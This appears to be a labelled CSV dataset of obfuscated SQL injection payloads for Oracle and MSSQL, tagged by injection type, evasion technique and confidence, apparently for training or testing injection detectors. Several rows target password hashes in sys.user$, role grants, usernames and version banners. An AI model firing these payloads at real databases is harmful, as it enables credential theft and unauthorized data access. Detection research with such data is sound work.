payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"AnD 0B091O0B0o0X8 = uTL_INadDr.gEt_hOst_ADdrEss ;( ] ("" seLEct DISTInCT ( GRaNtEd_rolE ) : FROM ( sELEct dIStinCt ( graNtEd_rOLe +) , Rownum As$LIMiT fRom dbA_Role_priVs AND/(sEleCt (selEcT 0o1))&&TRuE And "" "" LiKe "" "" && ""`""=""`"" OR[(SeLect (SeLEcT 0x0))!OR;(SELECT 2938)=0O0x15C0b101 Or FaLSE#whErE@grAnTee = Sys.lOginUSer ) WHERe lIMit liKe (SElEcT`(SELECT 8)) ) ` ) && |'i' likE 'Im[>)[{.",unknown,oracle,case_variation|function_alternative|hex_string,0.06,rule,sqliv5_json,string_double_quote
"/ && 0B7o4X6& likE UTL_InADdR.GeT_Host_AdDRess ( [ ( SeLEct distiNct ( PASsWOrd ) fROm (\ SELeCT distinCT >( pASsw or< d )$ , ROWNUm As LiMIT froM SYS.UsEr$ ) WHErE limIT = (sElect 0o7x5o8) )+ ) /*)JYoq CGe>(SELEcT (sEleCt 0O0O0x0X0o0xa))(SElECt (SELECT (SELECT 6))).GHhjb Y*/ aNd 'i' lIKe 'I",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SElEct * frOm uSers WHerE/*d (a0*:F:+!*/id )= (SELECt (sELEct 1)) * ( || faLSE aNd ""*"" NoT LIkE ""*p""*or FAlSE OR False#0B0B1 ) uniOn seLecT 0o3,BaNNeR froM V$vERSIon?wHERe rOwnum LIKE (seleCT 0x1) -- 0B0O1o1m",union_based,oracle,case_variation|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"AND 0o3o8O0O0 liKE ;uTL_iNaddR.Get_hoST_addResS [( (> ~select dISTiNcT ( PaSSwoRd ) FRoM ( selecT dISTINct /*3C[< b{D;ADls0u7*UeEc*/( pAsSwoRD ) , roWNuM""as LImIT froM sys.usER$ ) whERE LimIt LiKe (SEleCt}(sELeCt 3X0b0o25))* +) > ) && 'I' liKE 'I",unknown,oracle,case_variation|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"Select * frOM+uSErs@Where*id} lIKE '0O0x0X1b102O5'<@.. OR<0x2 AnD ^(SeleCt|0O1):ANd 0x1 AnD ""l""/*g8p*/ noT LIkE ""lU""&aNd:3X4%or fAlSE aND tRUE'OR fALsE; OR '0 AND ""0O3_Ap""^LIke+""4_Ap"" OR fAlSE~And (SeLECt]3X0) oR FalSe aNd TruE OR fAlSe OR FAlsE And (SeLeCt (SELECT (SELECT 1))) oR False OR False oR fALSE#?=^ 1b1x0x0x1x4 --]8O0O0X1',.RhF||7G",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"SelECt~* fROM uSErS\WhEre Id LIke '0O4' or \<\. oR 0B5O8b3 = (SELECt (SeleCt 0x9B1)) Or ""S"" lIKe[""SS""/**/anD trUe oR (SelEct (seLecT (SELECT (SELECT 0))))?--_0o0o0b201B1'dC, M,S",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"`sELECT * FrOM UserS wheRe ID=(SElEct 2) OR \.< & ^LIke ' 0X1[UnION seLect (selECT 0b1),@@VERSION OR (seLeCT 6199) nOT LIke 6196 && TRuE And 0o0X23eD NOT LIKe 0O21056)oR fALsE}-- 0B0O2o6",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"?SELeCT or false OR False<OR False#* FrOm USers-WhErE Id\= '0' + @ @0O0x6 unION:SelecT 7x0o0b1069x3,VerSIon .(=_)} oR (5X02A nOT=(SElEcT 0X43A)?--/* and ' ;)h' Not Like ' ;)H2' oR FAlSE Or FaLSe#IA0b0{%0x7:$W.H*/0b9';jt",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"SElecT * FRom UsErs[wHeRe ID = (sELect (SELECT (SELECT 1))).&<@ UNIon selecT 0B0,veRsiON (/ ) oR faLSE Or ',Y' liKe ',y9' && TruE -- 0B1k",union_based,unknown,case_variation|function_alternative,0.7,rule,sqliv5_json,unknown
"-seLeCt(* FROM USErs]wheRE Id likE $(SELECT (SELECT 1)) <@(SELECT 1)$ UNION sElECt 0o9x1,vErSiOn< ( ). OR+ 'x~r'+NOt LiKE 'X~r',oR 2x7\anD (selECt (SELECT 0x1c0o10f)) noT liKE 0x1B64 && True OR False --'4y?p%",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"]OR 0X0/*(SELECT (SELECT 2)); } v0b0*/ = 0b10 aND:0x1 && .(SELECT 6053) nOt lIKe (seLect (sElEct (selECt 1034))) And ""2"" lIke ""2"" and (SELECT (SELECT 3734)) LIKE 3734 oR FALsE AND True --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"SElEcT""*!FROm uSeRs whERE Id?= 0o3( or ~""{1"" = 0B3 oR (SeLect 0X1)/*(SeleCT (sELecT (SELECT (SELECT 5))))\yId*/ LIKe* 0x1 And true oR)""YAC"" Not liKe ""YaC"":-- 7H3UbA0B0P&B""UcyAf0o10",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"SeLeCT * FrOm,uSErS wHErE Id ,[LIke 0O1 or ""{,""=(SELECT 1) Or}(SEleCt 7) += 9 and tRUe*And 4o10X1 Or FaLSE AnD""""JL"" NOt?LiKE ""JlY"" AND "";""="";"" --*1kuEaxA",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"seLeCt * FroM uSErS WHErE iD LikE? (SelecT (SELECT 3)) or 4 ANd tRUe|or 0O0x0 aND 1448 LIke,0o0x0b101Ac oR<0x0 oR FalsE && 'l' NOT LikE 'l:' AND True OR False#"", UNIOn SeLEcT VErsIOn ( . ) ,vERsIOn/*Bj yB*/ ( ;) --)5u{LI3",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"sELECT * froM USErs wHERe Id> LiKE/**/ 0x0o3B1.<@. UnioN/**/selecT (SeLECt (selECt (SELECT (SELECT (SELECT 1))))),veRSioN +( ) and 0b6 anD "":g""="":g"" ~OR ""2u"" NOT LIKE ""2u"" AND '[R,'<>'[R,E' OR False AND True --|2o1",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"seLecT * FrOM usERs wHERe id lIkE (SeLECt (SElecT 0x2)) + @<@. uNion seLecT 4X0X0B7o0,VErSIoN[ ( { )/**/ && ""["";<> ""[\"" && ""2 oR 'R' LIkE 'Rh' oR (sELeCT (seleCt (SELECT (SELECT 0)))) OR 5x5 -- 0BRZ",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.7,rule,sqliv5_json,unknown
"SELecT * FRom USers whERE Id LikE (SELEct 0X0) Or/"" ) ["" oR 0b0X2 = (seleCT (SelecT 1)) OR ""m"" Not lIke ""m"" aNd TRUe OR False -- 1L",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
ANd (seLeCt 3x8) like Utl_InaDdr.GeT_hOST_AdDrEss ( /*Yk*(SELECT (SELECT (SELECT (SELECT (SELECT 1)))))*/ (+ !SELECT bAnNEr fROm>V$version wHeRe RowNUM -lIKE (SELECT (SELECT 0o0o0)) /)'/ ) [ && 'I'} lIkE 'i,error_based,oracle,case_variation|inline_comment|function_alternative,0.51,rule,sqliv5_json,unknown
"sElECt.* FRom USErs}wheRE ID = \0B101O9X1 <@$_ OR 0B10x5x0x0O0O1 LIKe $(SeLECT 0x1)~oR ""kL"" Not""LiKe ""Kl"" or "".mc<""="".mC<|"" Or FAlsE_ ANd tRUe OR&(select (sELecT 0b0B0B0)) AND/*L&*/(seLEct (sELecT 1)) Or fALse AnD TRuE ANd tRue or FaLSE && trUe OR fAlSe OR (seleCt 0) -- 0X1Z@",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"sElECT * FROM useRs WHErE ID = (select (SELECT 1)) Or ( \_ ) liKE (SELECT (SELECT 1)) UNIon SELect (selecT 0),@@VerSIOn or False ANd ""] 7_ "" noT Like ""] 0_ q"" -- 3",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_double_quote
|Or/**/AND;1435=1435#UsERID]liKe '%,unknown,unknown,comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,like_clause
"Union ( SElecT_nULl, NUlL, ( SELeCT @@versION ) ) !Or +false )aND ;TRUe or 'e'/NOt likE 'e' AnD/**/""9v"" not LiKE ""2vh"" Or (SELECT (sELeCT (selEct (SELECT 0)))) --",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
SELeCT * fROM_uSErS;WHerE iD\%= 0O5 Or $<\/**/Or](SeLeCt 0X0x1) _= [0x0 Or 0b0 oR/*)x^(~g6j*/ 'zu' NOT liKe 'zu' oR (selECt$0X0)? aNd <TruE\{ && (sEleCt (SELECt (seLECt (sElEct 1100)))) NoT lIkE 0O85723 AnD TruE --.(sElECt 0X3)- m,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"seLECT * fRom uSERS WherE ID liKe (SELEcT 0X0x8). UNION SelEcT (SelEct (SElEcT 0X1)),VeRSion ( > ) AnD True aND 'wR' nOt LIKE 'Wrt' -- 0o9X0o5x0",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"!UNIOn/*)&*/[ (; SeLECt)@@vErSiOn ) /*r|m/ge 0X0b201u}u33kBb*/ or)@3o6o6X0B0o0B158X0X0X0O4(and ""f"" nOT?likE|""fD"" aNd ""PF""<>""Pf6"",oR 0x6o4and""X(""~NOt likE ""X(B""[_&&$ TRUe AND tRuE or FAlSE[or falSe or (SeLEcT (sEleCT (sELeCt (selecT (SELECT/**/(Select 0x0)))))) OR ""lRL""=""lrlp""{Or fAlsE OR faLSe'aNd TRUe Or (SELECT 0) --",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"UnIoN ( sElect nuLL, Null,""NULl, NulL, (nuLL, ) ( sELect @@verSIon /*)kFDmU>At*/ ) ) AND@tRuE=Or ""0J"" Not:Like ""0o0x3O21j""[or ""S""=""sE"" And (sELECt (SeLeCT 0X0x0o1))*Or FAlse || fAlsE AND$TRUe OR/*E*/(SeLECT (selECt (SeLEct (seleCT (SELECT 322))))) liKe (seLEct (seLeCt 0x143)) aND 7299<>(SelEct 0x1c1a) && 's'!='sj' oR fAlSE AND True --",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"sELECT * froM%userS wHERe Id |= 0x1 Or "" (` &"" OR^0O1=0B110X0o1= oR (selecT (SElEct 2b0X503)) nOT liKE (SeleCt/*D*/(SeleCT (selECt (SELECT (SELECT 1280))))) OR fAlSE Or+ ""g""[lIKE ""g:"" OR faLSE:-- 0b0O1",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"<SElect * From uSERS(wHeRe'Id LIKe (SELeCT (seLecT/0x7)) oR 2x0B100<@<=/*\T7FWb/ DET<=~`a IgoH~d aNd (selECT (seLECt (SELECT 1156))) nOt lIKE`(sELect 1157) Or 0 OR False#uj +O*/0b0O0x0b113x8;UnIoN`SeleCT)0o1,veRSIoN +(`-| )_ OR 'h' nOT<like/'H' OR '`F' lIkE '`fr'~--/*_v <J*;?a>-*/5x1w|",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.7,rule,sqliv5_json,string_single_quote
"seleCT * from uSeRS wHErE Id = (SELEct 8)<@<@ UNIoN sELEcT (sElEct (SELECT 0o0x1)),verSioN ( >) oR "";""} LikE "";C"" OR False OR False -- 7",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"seLect */**/FrOM:useRs WhEre iD?=(2B7 Or ""0O8["" Or 0B0x1=(seLEcT`(SElECT (SElEcT (SElEcT 7)))).AnD TRUE ANd(0B0101710021011 = (seLECT (seLECt (SELECT 7051))):Or (sElEcT 0X2) And """"l?""=""""l?"" Or@ FAlSe OR ""L"" NOt LIKE ""L"" OR 0x109<>6x109 ANd!""li""<>""Li6"" Or faLSE OR 0 OR False#-- 6A;#HG",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"sELEcT!* fRom USerS WheRE~ID like (SELECt (SeLECt 0o1)) oR (sELecT 0x5) or 'W' noT lIKE 'w' anD tRUE AnD tRuE && (SeLEct 2552) Not lIKe (sElEcT 2556) oR false oR FAlse#""3b1101@UnIOn-sELEct 0b50,versION '( /*B|HYyG +sxRj?*/ ) -- 7_?:{",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"SelECt * from(uSeRS wHerE iD LIke (seLEcT (selecT 0X2)) + \+%\ or|7 = ?(seLeCt 0b1) && ""i""<>""iD"" Or '[J' nOt Like '[J' Or fALse OR (sEleCT (SElECT (SElEcT 0))) anD true --/**/6x3?!",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"SELEct * FROm UserS;wHeRE ID lIke/**/ '3x0x0b1' Or $<\.{UnIOn^SEleCT 4O0X0O0o1,@@vERSIon?AND>0x0X0B0b8>Or falsE and,tRue:aNd""'!')not %Like '!S'/OR 'S'/*""$},`*/not LIke 's' Or _fAlSe OR (selECt (SElEct (sElECt (SELECT 0)))) oR FALSe aNd\tRuE OR faLsE --*2b3'D9g;?!Nhe`2f",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SeleCt * FROM uSers where ID = (SELECT (SELECT 6)) Or ""].""||1* = (SELect (SELECT (SELECT 1))) and '0O1'='8X7'.And ""2<D"" NOt lIKE ""2<DF"" ANd[True oR (SeLeCT 0x0)+ /OR fALSe -- (sELECt 0x1)?.KE^)?+",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
"SELECT * FrOm uSers WHere Id likE 0o5 or "" )/*\XLr}(SELeCT 0X6)(An:p!*/ ( ""@ = ?(seLEct (SeLEcT[(SeLEct (seLect (select (SelEcT (select (SeLEcT (selECt 5))))))))) Or 0O0X0o5 Or ""Ea%""~Not LiKe ""Ea%"" and ""\h"" != ""\Hg"" OR ""v""!=""V"" AND trUE AND ""q"" LIKE ""Q"" aND tRUE# = 0b4209(-- 0X1_)'I",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"?SEleCt *'fRom USErS WHeRE Id~/**/Like '2' UNiOn\sEleCt.\. oR)(SELECT 1049)`NOT LIke&(SelEcT (SELECT 1041)) anD tRue && True#,@@VerSion -- 0o0x0b10'KZ""gJ",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"SELECt * fROm/*j ](seLEct 0x48)*/users;wherE Id/*&XiEI &ixhNPr*(TCt*/?LIKe '0b9B0O0B7'+uNIoN SeLEct \.,@@VeRSiON OR} faLse_--*0b101o0b4B0b0X0B110' YP",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SeLect]* FRom uSErs wHere ID = 4x4 +0x0X3<@ uNIOn SElect NULl,veRsioN ( ) and`trUe && ""pV""<>""PV}"" And true oR FAlSe/**/AND trUE AND ""+y"" NOT LIKE ""+yB"" OR False -- 0x8+(SELECT (SELECT (SELECT 0)))$",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"&& (SELEcT (SELECT 0B0O2X0o0o0b510x5O0b0b0b1111110012o0O3))$?LIKe utL_iNaddR.Get_HoSt_AdDREss/*`(sELeCt 0X3)*;(seLECT 0x5)*/ ( < ( SEleCT|COuNt :( dIsTInCT ( USERName ) / ) /*KplRb?T0sPl*/ FROM sYS.alL_uSERs , ) ) && ? 'i' LIKE 'i",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"SeLect * fRoM USers%WherE ID <= (seLeCT (SELECT 1)) Or "".{"" or/*e6/LU*/(SELECT 1)=(seLeCt (SELECT 1)) Or (SELECT 1) or 0o0B0 Or ""e""=""et"" aNd '%EMn'<>'%EMn{' and ""% l"" nOt lIkE ""% L"""" OR False -- 0X0XCJd*",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"SElECt(* frOm USErS WHerE Id = '8X0o5' oR \<$ oR:(seLect (SelECt 1)) LIKE =(SELECt (sEleCT (selEcT 4))) oR 0o0X0O0xf3E nOT@like (SeLEct 7Xf3e) or ""x""=nOt lIkE ""X"" AnD (SELECT 2604)/not[LikE 0xA2D -- 1'C",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"AND (SelECT 0O0O0O0O2x0O5)=UtL_inADDr.GEt_hOST_AddREsS} ( \(; SELECT dIstinCT (; COLuMN_Name +) fROm ( sElEct dISTiNcT ( ;colUmN_naMe `) , RownuM as limIt fRoM all_TAB_CoLuMNS+ ) /*0X2\;g)?BpufLX;)kX!*/ wHere LImit LIke 0X2B0O0x8 ),( ) AND 'I' LIke 'I",stacked_queries,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
",SelecT * fRom UsERs wherE]iD = 0X2b11.aNd@ uNion SeLECT (SElect (seleCt (SEleCT 0x1))),VerSIOn ( + =)) or 'Ia' <> 'iA' && 0x0x0O0O1:AnD (SEleCt 0xccb)?in ((Select (SElECT (sELECT 3239))),(SelEcT (seleCT 0x8bb)),0Xca4) OR '}^`5' nOt LikE '}^`0b101' OR 1203 NOT LIKE (SELECT 1203) --:0O1Ww",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"SElecT[* from USers%WheRe Id]liKE 0X0b110 +""@<@ OR 0O0x0O0 aND 'fR' Like~'Fr' oR FaLse{ OR ""G"" NOT liKE ""g"" oR falSe or FALse and]tRue oR FaLsE AND True# uNion SElecT null,VeRsioN +( ) +-- (SELECT 1)!N",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
":&& 0o3X0O4x2:=\Utl_iNAdDr.gET_hOSt_AdDrEss }( ; ( +seLEcT DiStINCt ( paSsWoRd^?) FrOM *~( SELECT distinCT ( pASSw Or d ) , ROWNUm As lImIT FRom sYs.USer$ +)"" WhEre LiMIt LIKE (seLECT (sElect/**/(SelecT 0o9x0b0X7))) ) ) anD 'i' LiKE ""'I",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
aDMin' &) \ |Or .( }'0o7'/*g8ze*TjEc M?S*/}lIkE '0x3' Or FALse anD trUe anD=/ TRuE or falsE oR faLsE{OR faLSe ANd 0O0b0x17C0o9 NOT LIKE (SELeCT (sElECt (SELECT (SELECT 6086))))# 0o1O4B0b0b3n!nrW,unknown,unknown,case_variation|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"SeLeCT** FroM+UseRS/wHErE_iD like \3X0x0o11@%_}( (0X1X7, )~).oR 0b0B7o1789 lIKe 0B0X8O4O4 or|fAlse <&&^`0x0x0X5/*)0o0cOfW|',y;#M_h;:*/or*'m'<NoT LIkE 'M'*And<TrUE oR [ *~""-"" not like?""-"" oR`faLSe --.0o0O0B0B101010010101111111001110zJBA1Dd",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"SEleCT * FROM UsErs wHErE iD =! (SELEcT 1) Or @ oR (SELECT 2118) Not Like (seLecT (seLecT (SElecT 2969))) oR{faLSe,Or 0x0x214D=(SeLEct 8526) OR ""+"" nOT LIKE ""+"" OR FalSE#"" ( = (seLect 0X1) OR%(SElECT#(Select 1)) = 1X1 -- 0O1!b9",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"seLECt * FRom usErS WHerE~ID""=]0x0X0b9 Or%@ oR)0o0O10 OR:faLSeAND"" IP"" not LIKe "".IPn""#"". = (SELEcT (sELECt 0x1)) OR 0X0O7 |= %(sEleCT\(SelEct (sELect 0x1))) -- 1P",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"SeLeCT * from USErs WhERe iD='7'& or { $<\ unioN sELeCt 0X0o1,@@veRSion\ oR% ' aNd (sElEcT 0O0X0O15) or (sELEcT 0x1327) lIKe 9X6XCC0o4 Or "" RG"" nOt liKE "" rG"" and truE or fAlSe oR 4X0 anD truE ANd (sEleCT (SeLect (seLEct (sELECT (SELECT 0x1bbe))))) NOt likE 7X1BBf[aND TruE AnD TrUe#'_NoT lIKE '#' -- 0o6'FrMk",union_based,mssql,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,string_single_quote
"&& (SeLeCT (sElECt (SELEcT (seLeCt (selecT (SELECT 1)))))) LIKE utl_inADDr.geT_HOsT_adDrESs ( ( SeLECT diSTINCt ( usERNAme ) &FRoM ( SELect diSTiNCT ( USErnAMe ) , rOWnUM aS liMIt FrOM SyS.ALl_UsERS ) WHERE lImiT=0O1o5 - ) ! ) AnD 'I' lIke 'I",error_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"AdmiN""""`) %^Or ""0O2""} LIKe? ""2""!or ""`"" NoT(liKe ""`"" OR~(SELECt 0x0B0) oR<FAlsE(ANd TruE OR FalSe AND (SELECT (SELECT 1)) AND True#v I """,unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_double_quote
";SEleCT;*{FRoM UserS whERE)id='3O0b0b5'$oR @*]( 1x0B6b1 ) /*Gh2]vj!(SeleCt (SELECT 0))^ poJ""fl e*/ >LiKe 0x0B0o0 UnioN SelEct (SELecT (sELEct 0o1)),verSiON{:( ;< ) oR (Select (seLECt (SELect 0x0O0)))}Or 'S'$noT lIkE 's'|Or 1X0o5aB Not lIkE 3X5AB and 0X1- ^AnD (SELEct 0X0o1) or 0X2279=6x227A OR FALSe ANd 2986!=(sElECT (sElECT 2947)) || (seLECT 7968) NoT lIKe (SELECT 7968) --;1'^n5b)",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"SelecT ?OR (SELEct 0X0) anD tRuE%OR fAlse anD True AND "";;""<>"";;V""#* fRoM\USERs wHErE+iD(LIKE '0x1'_<@&@{Or (sElect;(seLeCt (sELECt (SeleCt 0x0o73ab))))/**/IN (0x0B1100111101055,(SeLect 0B0X7b10011ab),0X0b10011ac) -- 1'K%&l*",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
>Or_uSerNaME*LiKe '%,unknown,unknown,function_alternative,0.0,rule,sqliv5_json,like_clause
?OR AnD 0O0x1Fc2<>(SeLeCT 0o0O17703) or (sElEcT 5107) NoT`lIke/**/(SelEct 5007)=Or FALse aNd (SELECT 3070)<>(SeLECT 3071)#UnAME Like '%p,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,like_clause
"SeleCT * frOM UsErs Where ID LiKe (sElect (SELECT 1))?*$ . UNIon sEleCt NUlL,@@VERSIoN ANd ""5S"" lIke ""0X5s"" )oR \](SElect (SELECT 7)) -- 0b0B1",union_based,mssql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"SeLecT *-frOM USErs wherE id lIke '1' * ( 2B9X0O6 ) UnIOn SeleCt 9,bAnNeR from V$vERSion wheRE ROwNUm LIKE (SelECt (SElECT-(SELECT (SELECT 1))))&or['<' NOT Like '<' oR fALSe -- 2'",union_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"AND 0B9b8b0b0b111 lIKE utl_INAdDr.GeT_HOst_AdDresS ( ( SELEct diSTIncT ( usErNaMe /*o?> W%;vwyk\*/) from ( sElecT dIStiNcT (? oR (sELEcT (SelECt (sEleCt (SeLecT (SELeCt 0))))) Or FalSe OR 'q' NOT lIke 'q' oR FALSe[aND 7833 NOt LIKe 0X1e98 oR FalSE OR False#usERNAMe )/*AR+I;>Q l S4 zdISs*/ , ROWNUm as liMiT frOm SYS.aLl_uSErS ) wHeRe LiMIT^ Like 3x7x0 )^ ) \ANd'i' lIKe ['I",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
"SELeCt * FrOM USERS+wHERe ID LIKe ` (SElecT (seLeCt (SELECT 1))) + [(/*?I*/ \. ) uNIon selECT NUlL,@@verSIon AND 1B0b8 Or 'L' Not LikE 'L' Or 0x15fB NOT lIke (sELECT 0O12773) oR fAlse aND (sELecT 0x664)!=(sEleCT 0x665) OR False -- 1x~",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"SElEcT]* fRom UsERs whErE ID like '2' Union SelEcT "";""_,verSion ( ' ) ;\-- AnD?'o'?NOT ={'OC' OR falSE AnD 0O0X1 Or "";G"" not Like "";g""#0B0O4O6'R -ak",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_single_quote
SELEcT */*o9Y*/FRoM USERs wHerE iD_ lIkE (sElecT (SELECT (SELECT 1))) += ( \ ) Or 0O1 LIKE 0b1 or fALse or '~B' lIKe '~be' OR False OR False -- 1u,boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"&& 0x0o3=UTl_iNAddR.Get_hOst_adDrEss ($ &( SEleCt DIStInCt %( GraNted_rOle ) .)fRoM] :( $seLecT;dIStinCT (!<GrAnTeD_ROlE@ ) , rownUM as lImiT frOM.DBA_RolE_pRivs wHere GRAnTEe '= *sYS.logiNUSEr* ) where lImIt =/*(SEleCT 0O0x0X3)'5CWu0is aND (SelEct (SeleCt (sELECt 0x1))) or ';&' LIKE ';&.' anD true anD (sElECT 1) aND True#kX,W::cr (sElEcT 0x9)@(SELeCT 8) r*/ (sELEcT 0O0x0B510)& ) ) aNd:'I' LikE 'iD",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.41,rule,sqliv5_json,unknown
"SeLEct *)from USErs WheRe]Id LIKE (SELECT 9) or "";."" = 0 oR (SELECT 1) =& (SELECT 1) anD 0b1 && 'T' NOT LIKE 'Tp' OR False AND True -- 1Xh",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"SELECt * From USeRS WhERE ID =]0X3 OR (seLECt 0B10)?aNd.'T'<>'t@' aND 'V$'='V$' And ""e"" not lIke ""EH"";Or False anD TruE#""? = (SElecT 0O1) UNION sElecT-(seLeCt (seLEct (SELEct (SELECT 1)))),vERSIon ( ) _@--/*Sti)uf Of +w*/0o0x1} 9o",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.7,rule,sqliv5_json,unknown
